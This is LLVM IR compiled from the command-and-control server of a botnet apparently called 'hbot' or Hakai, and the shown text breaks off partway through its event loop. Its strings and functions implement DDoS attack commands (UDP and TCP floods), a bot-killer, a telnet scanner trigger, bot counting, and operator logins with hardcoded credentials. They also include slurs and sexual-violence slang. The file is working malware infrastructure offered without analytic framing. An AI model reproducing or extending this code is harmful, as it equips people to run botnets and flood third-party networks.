; ModuleID = 'host/ir_O1/Hakai.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], [512 x i8], i8 }
%struct.telnetdata_t = type { i32, i32, [20 x i8] }
%struct.name = type { [512 x i8], i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.account = type { [200 x i8], [200 x i8], [200 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"\0D\0A\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"name:\00", align 1
@arra = internal global [40 x %struct.name] zeroinitializer, align 16
@.str.7 = private unnamed_addr constant [9 x i8] c".DSLKFJ\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"LOCKED \00", align 1
@fileFD = internal unnamed_addr global %struct._IO_FILE* null, align 8
@.str.10 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"killed pid\00", align 1
@BOATSRAPED = internal global i32 0, align 4
@.str.12 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.14 = private unnamed_addr constant [6 x i8] c"\22%s\22\0A\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.15 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.17 = private unnamed_addr constant [15 x i8] c"[%d.%d.%d.%d]\0A\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@titleWriter.spinbuf = private unnamed_addr constant [4 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0)], align 16
@.str.23 = private unnamed_addr constant [35 x i8] c"%c]0;%d Devices Connected %s  %s%c\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\5C\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"|\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.24 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@.str.25 = private unnamed_addr constant [7 x i8] c"shadoh\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"!HBOT\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.27 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.28 = private unnamed_addr constant [30 x i8] c"\1B[1;31mUsername\1B[1;36m:\1B[37m \00", align 1
@.str.30 = private unnamed_addr constant [15 x i8] c"connection.log\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.32 = private unnamed_addr constant [26 x i8] c"[LOGIN ATTEMPT] USER: %s\0A\00", align 1
@.str.33 = private unnamed_addr constant [30 x i8] c"\1B[1;31mPassword\1B[1;36m:\1B[37m \00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"[FAILED ATTEMPT] USER: %s\0A\00", align 1
@.str.36 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.37 = private unnamed_addr constant [43 x i8] c"\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.29 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.39 = private unnamed_addr constant [6 x i8] c"count\00", align 1
@.str.40 = private unnamed_addr constant [9 x i8] c"botcount\00", align 1
@.str.41 = private unnamed_addr constant [30 x i8] c"\1B[37;1m%s\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [33 x i8] c"\1B[37;1mtotal\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [6 x i8] c"rape?\00", align 1
@.str.44 = private unnamed_addr constant [34 x i8] c"\1B[0mhbot.botkill: \1B[1;31m%d\1B[0m\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.47 = private unnamed_addr constant [28 x i8] c"\1B[0mresolved [%s] to [%s]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.49 = private unnamed_addr constant [37 x i8] c"\1B[0mddoscmds - shows ddos commands\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [36 x i8] c"servercmds - server side commands\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [29 x i8] c"admincmds - admin commands\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"servercmds\00", align 1
@.str.53 = private unnamed_addr constant [29 x i8] c"\1B[0mbots - shows bot count\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [29 x i8] c"exit - disconnect from net\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [28 x i8] c"help - displays help menu\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [10 x i8] c"admincmds\00", align 1
@.str.57 = private unnamed_addr constant [51 x i8] c"\1B[0mbtype - shows architecture of bots connected\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [46 x i8] c"users - displays who's connected to the net\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [66 x i8] c"addusr - add users via server side (IN DEVELOPMENT! VERY BUGGY)\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [32 x i8] c"start - starts telnet scanner\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [39 x i8] c"kickuser - logs user out must be admin\00", align 1
@.str.62 = private unnamed_addr constant [41 x i8] c"You Must Be Admin to Use This Command!\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"ddoscmds\00", align 1
@.str.64 = private unnamed_addr constant [28 x i8] c"\1B[0mUDP ip port time size\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [24 x i8] c"TCP ip port time size\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"\1B[0m\00", align 1
@.str.69 = private unnamed_addr constant [16 x i8] c"Attack Sent! \0D\0A\00", align 1
@.str.70 = private unnamed_addr constant [12 x i8] c"actions.log\00", align 1
@.str.71 = private unnamed_addr constant [31 x i8] c"[hbot] [%s] [Sent an Attack!]\0A\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c". KT\00", align 1
@.str.73 = private unnamed_addr constant [32 x i8] c"[hbot] [%s] [Killed All Pid's]\0A\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"users\00", align 1
@.str.76 = private unnamed_addr constant [39 x i8] c"\1B[31m- \1B[31mOnline Users \1B[31m-\1B[37m\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [37 x i8] c"\1B[37mID(\1B[31m%d\1B[37m) \1B[31m%s\1B[37m\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"kickuser\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"user=\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"USER=\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.82 = private unnamed_addr constant [43 x i8] c"\0A\1B[31mGoodbye, kicked by \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [30 x i8] c"\1B[33mKicked \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"id=\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"ID=\00", align 1
@.str.86 = private unnamed_addr constant [46 x i8] c"\1B[33mKicked user with id of \1B[34m%d\1B[37m...\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [53 x i8] c"You Must Be big daddy shadoh to kick others, queer\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.89 = private unnamed_addr constant [24 x i8] c"echo '\0A%s' >> login.txt\00", align 1
@.str.90 = private unnamed_addr constant [33 x i8] c"[hbot] [%s] [added a user] [%s]\0A\00", align 1
@.str.91 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"chat.log\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.95 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.96 = private unnamed_addr constant [26 x i8] c"[hbot] [Admin Connected] \00", align 1
@.str.97 = private unnamed_addr constant [39 x i8] c"[hbot] [Admin Connected] [%d.%d.%d.%d]\00", align 1
@.str.98 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external local_unnamed_addr global %struct._IO_FILE*, align 8
@.str.99 = private unnamed_addr constant [46 x i8] c"[hbot] Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.101 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.102 = private unnamed_addr constant [11 x i8] c"killer.txt\00", align 1
@kfileFD = internal unnamed_addr global %struct._IO_FILE* null, align 8
@.str.103 = private unnamed_addr constant [31 x i8] c"[hbot] Lower Threading Count.\0A\00", align 1
@.str.104 = private unnamed_addr constant [33 x i8] c"[hbot] Socket Opened On Port %d\0A\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"hbot\00", align 1
@.str.109 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.110 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1
@str = private unnamed_addr constant [30 x i8] c"[hbot] Lower Threading Count.\00"

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8* nocapture, i32, i32) local_unnamed_addr #0 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #10
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %14, %13
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.0.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.0.lcssa = phi i32 [ 1, %3 ], [ %.0.lcssa.ph, %.critedge.loopexit ]
  ret i32 %.0.lcssa
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8* nocapture) local_unnamed_addr #0 {
  %2 = tail call i64 @strlen(i8* %0) #9
  %3 = add i64 %2, 4294967295
  %4 = tail call i16** @__ctype_b_loc() #11
  %5 = load i16*, i16** %4, align 8
  br label %6

; <label>:6:                                      ; preds = %6, %1
  %indvars.iv29 = phi i64 [ %indvars.iv.next30, %6 ], [ 0, %1 ]
  %7 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv29
  %8 = load i8, i8* %7, align 1
  %9 = sext i8 %8 to i64
  %10 = getelementptr inbounds i16, i16* %5, i64 %9
  %11 = load i16, i16* %10, align 2
  %12 = and i16 %11, 8192
  %13 = icmp eq i16 %12, 0
  %indvars.iv.next30 = add nuw i64 %indvars.iv29, 1
  br i1 %13, label %.preheader, label %6

.preheader:                                       ; preds = %6
  %14 = trunc i64 %3 to i32
  %15 = trunc i64 %indvars.iv29 to i32
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %.critedge.preheader, label %.lr.ph22

.lr.ph22:                                         ; preds = %.preheader
  %17 = load i16*, i16** %4, align 8
  %sext = shl i64 %3, 32
  %18 = ashr exact i64 %sext, 32
  %sext31 = shl i64 %indvars.iv29, 32
  %19 = ashr exact i64 %sext31, 32
  br label %24

.critedge.preheader.loopexit:                     ; preds = %24, %33
  %.0.lcssa.ph = phi i32 [ %32, %24 ], [ %34, %33 ]
  br label %.critedge.preheader

.critedge.preheader:                              ; preds = %.critedge.preheader.loopexit, %.preheader
  %.0.lcssa = phi i32 [ %14, %.preheader ], [ %.0.lcssa.ph, %.critedge.preheader.loopexit ]
  %20 = icmp sgt i32 %15, %.0.lcssa
  br i1 %20, label %.critedge._crit_edge, label %.critedge.preheader26

.critedge.preheader26:                            ; preds = %.critedge.preheader
  %sext32 = shl i64 %indvars.iv29, 32
  %21 = ashr exact i64 %sext32, 32
  %sext33 = shl i64 %indvars.iv29, 32
  %22 = ashr exact i64 %sext33, 32
  %23 = sext i32 %.0.lcssa to i64
  br label %.critedge

; <label>:24:                                     ; preds = %33, %.lr.ph22
  %indvars.iv27 = phi i64 [ %indvars.iv.next28, %33 ], [ %18, %.lr.ph22 ]
  %.021 = phi i32 [ %34, %33 ], [ %14, %.lr.ph22 ]
  %25 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i64
  %28 = getelementptr inbounds i16, i16* %17, i64 %27
  %29 = load i16, i16* %28, align 2
  %30 = and i16 %29, 8192
  %31 = icmp eq i16 %30, 0
  %32 = trunc i64 %indvars.iv27 to i32
  br i1 %31, label %.critedge.preheader.loopexit, label %33

; <label>:33:                                     ; preds = %24
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %34 = add nsw i32 %.021, -1
  %35 = icmp sgt i64 %indvars.iv27, %19
  br i1 %35, label %24, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader26, %.critedge
  %indvars.iv = phi i64 [ %21, %.critedge.preheader26 ], [ %indvars.iv.next, %.critedge ]
  %36 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %37 = load i8, i8* %36, align 1
  %38 = sub nsw i64 %indvars.iv, %22
  %39 = getelementptr inbounds i8, i8* %0, i64 %38
  store i8 %37, i8* %39, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %40 = icmp slt i64 %indvars.iv, %23
  br i1 %40, label %.critedge, label %.critedge._crit_edge.loopexit

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %41 = sub i64 %.019.lcssa, %indvars.iv29
  %sext34 = shl i64 %41, 32
  %42 = ashr exact i64 %sext34, 32
  %43 = getelementptr inbounds i8, i8* %0, i64 %42
  store i8 0, i8* %43, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) local_unnamed_addr #0 {
  %4 = alloca [56 x i8], align 16
  %5 = alloca i64, align 8
  %6 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %7 = icmp eq i32 %6, 0
  %8 = tail call i64 @strlen(i8* %0) #9
  %9 = add i64 %8, 10
  %10 = tail call noalias i8* @malloc(i64 %9) #10
  %11 = tail call i64 @strlen(i8* %0) #9
  %12 = add i64 %11, 10
  tail call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 %12, i32 1, i1 false)
  %13 = tail call i8* @strcpy(i8* %10, i8* %0) #10
  tail call void @trim(i8* %10)
  %14 = call i64 @time(i64* nonnull %5) #10
  %15 = call %struct.tm* @localtime(i64* nonnull %5) #10
  %16 = call i8* @asctime(%struct.tm* %15) #10
  call void @trim(i8* %16)
  %17 = getelementptr inbounds [56 x i8], [56 x i8]* %4, i64 0, i64 0
  %18 = zext i32 %1 to i64
  br label %19

; <label>:19:                                     ; preds = %64, %3
  %indvars.iv = phi i64 [ 0, %3 ], [ %indvars.iv.next, %64 ]
  %20 = icmp eq i64 %indvars.iv, %18
  br i1 %20, label %64, label %21

; <label>:21:                                     ; preds = %19
  %22 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %indvars.iv, i32 3
  %23 = load i8, i8* %22, align 1
  %24 = icmp eq i8 %23, 0
  br i1 %24, label %25, label %30

; <label>:25:                                     ; preds = %21
  br i1 %7, label %64, label %26

; <label>:26:                                     ; preds = %25
  %27 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv, i32 1
  %28 = load i32, i32* %27, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %64, label %.thread

; <label>:30:                                     ; preds = %21
  br i1 %7, label %.critedge, label %.thread

.thread:                                          ; preds = %26, %30
  %31 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv, i32 1
  %32 = load i32, i32* %31, align 4
  %33 = icmp eq i32 %32, 0
  br i1 %33, label %42, label %34

; <label>:34:                                     ; preds = %.thread
  %35 = trunc i64 %indvars.iv to i32
  %36 = call i64 @send(i32 %35, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 7, i32 16384) #10
  %37 = call i64 @strlen(i8* %2) #9
  %38 = trunc i64 %indvars.iv to i32
  %39 = call i64 @send(i32 %38, i8* %2, i64 %37, i32 16384) #10
  %40 = trunc i64 %indvars.iv to i32
  %41 = call i64 @send(i32 %40, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384) #10
  br label %42

; <label>:42:                                     ; preds = %.thread, %34
  %43 = call i64 @strlen(i8* %0) #9
  %44 = trunc i64 %indvars.iv to i32
  %45 = call i64 @send(i32 %44, i8* %0, i64 %43, i32 16384) #10
  %46 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv, i32 2, i64 0
  %47 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0), i8* %46) #10
  br i1 %7, label %61, label %48

; <label>:48:                                     ; preds = %42
  %49 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv, i32 1
  %50 = load i32, i32* %49, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %61, label %52

; <label>:52:                                     ; preds = %48
  %53 = call i64 @strlen(i8* nonnull %17) #9
  %54 = trunc i64 %indvars.iv to i32
  %55 = call i64 @send(i32 %54, i8* nonnull %17, i64 %53, i32 16384) #10
  br label %64

.critedge:                                        ; preds = %30
  %56 = call i64 @strlen(i8* %0) #9
  %57 = trunc i64 %indvars.iv to i32
  %58 = call i64 @send(i32 %57, i8* %0, i64 %56, i32 16384) #10
  %59 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %indvars.iv, i32 2, i64 0
  %60 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %17, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0), i8* %59) #10
  br label %61

; <label>:61:                                     ; preds = %.critedge, %48, %42
  %62 = trunc i64 %indvars.iv to i32
  %63 = call i64 @send(i32 %62, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0), i64 1, i32 16384) #10
  br label %64

; <label>:64:                                     ; preds = %26, %52, %61, %19, %25
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 1000000
  br i1 %exitcond, label %65, label %19

; <label>:65:                                     ; preds = %64
  call void @free(i8* %10) #10
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #4

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) local_unnamed_addr #4

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @removestr(i8*, i8* nocapture readonly) local_unnamed_addr #0 {
  %3 = tail call i8* @strstr(i8* %0, i8* %1) #9
  %4 = tail call i64 @strlen(i8* %1) #9
  %5 = getelementptr inbounds i8, i8* %3, i64 %4
  %6 = tail call i64 @strlen(i8* %5) #9
  %7 = add i64 %6, 1
  tail call void @llvm.memmove.p0i8.p0i8.i64(i8* %3, i8* %5, i64 %7, i32 1, i1 false)
  ret void
}

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline noreturn nounwind uwtable
define noalias nonnull i8* @epollEventLoop(i8* nocapture readnone) #6 {
  %2 = alloca %struct.epoll_event, align 4
  %3 = alloca %struct.sockaddr_in, align 2
  %tmpcast = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %4 = alloca i32, align 4
  %5 = alloca [200 x i8], align 16
  %6 = alloca [2048 x i8], align 16
  %7 = tail call noalias i8* @calloc(i64 1000000, i64 12) #10
  %8 = bitcast i8* %7 to %struct.epoll_event*
  %9 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2, i32 0
  %11 = getelementptr inbounds [200 x i8], [200 x i8]* %5, i64 0, i64 0
  %12 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 1
  %13 = bitcast %union.epoll_data* %12 to i32*
  %14 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %2, i64 0, i32 0
  %15 = getelementptr inbounds [2048 x i8], [2048 x i8]* %6, i64 0, i64 0
  br label %.loopexit.outer

.loopexit.outer.loopexit:                         ; preds = %141
  br label %.loopexit.outer

.loopexit.outer:                                  ; preds = %.loopexit.outer.loopexit, %1
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.outer, %.loopexit
  %16 = load volatile i32, i32* @epollFD, align 4
  %17 = call i32 @epoll_wait(i32 %16, %struct.epoll_event* %8, i32 1000000, i32 -1) #10
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %.lr.ph88.preheader, label %.loopexit

.lr.ph88.preheader:                               ; preds = %.loopexit
  %19 = sext i32 %17 to i64
  br label %.lr.ph88

.lr.ph88:                                         ; preds = %.lr.ph88.preheader, %141
  %indvars.iv102 = phi i64 [ 0, %.lr.ph88.preheader ], [ %indvars.iv.next103, %141 ]
  %20 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i64 %indvars.iv102, i32 0
  %21 = load i32, i32* %20, align 1
  %22 = and i32 %21, 25
  %23 = icmp eq i32 %22, 1
  br i1 %23, label %31, label %24

; <label>:24:                                     ; preds = %.lr.ph88
  %25 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i64 %indvars.iv102, i32 1
  %26 = bitcast %union.epoll_data* %25 to i32*
  %27 = load i32, i32* %26, align 1
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %28, i32 3
  store i8 0, i8* %29, align 1
  %30 = call i32 @close(i32 %27) #10
  br label %141

; <label>:31:                                     ; preds = %.lr.ph88
  %32 = load volatile i32, i32* @listenFD, align 4
  %33 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %8, i64 %indvars.iv102, i32 1
  %34 = bitcast %union.epoll_data* %33 to i32*
  %35 = load i32, i32* %34, align 1
  %36 = icmp eq i32 %32, %35
  br i1 %36, label %.preheader64, label %99

.preheader64:                                     ; preds = %31
  store i32 16, i32* %4, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = call i32 @accept(i32 %37, %struct.sockaddr* nonnull %tmpcast, i32* nonnull %4) #10
  %39 = icmp eq i32 %38, -1
  br i1 %39, label %._crit_edge, label %.lr.ph83.preheader

.lr.ph83.preheader:                               ; preds = %.preheader64
  br label %.lr.ph83

._crit_edge.loopexit:                             ; preds = %.backedge65
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader64
  %40 = tail call i32* @__errno_location() #11
  %41 = load i32, i32* %40, align 4
  %42 = icmp eq i32 %41, 11
  br i1 %42, label %141, label %43

; <label>:43:                                     ; preds = %._crit_edge
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0)) #12
  br label %141

.lr.ph83:                                         ; preds = %.lr.ph83.preheader, %.backedge65
  %44 = phi i32 [ %97, %.backedge65 ], [ %38, %.lr.ph83.preheader ]
  %45 = load i32, i32* %10, align 2
  %46 = sext i32 %44 to i64
  %47 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %46, i32 0
  store i32 %45, i32* %47, align 4
  call void @llvm.memset.p0i8.i64(i8* nonnull %11, i8 0, i64 200, i32 16, i1 false)
  %48 = call i32 @fdgets(i8* nonnull %11, i32 200, i32 %44)
  %49 = call i8* @strstr(i8* nonnull %11, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0)) #9
  %50 = icmp eq i8* %49, null
  br i1 %50, label %.preheader.preheader, label %51

; <label>:51:                                     ; preds = %.lr.ph83
  call void @trim(i8* nonnull %11)
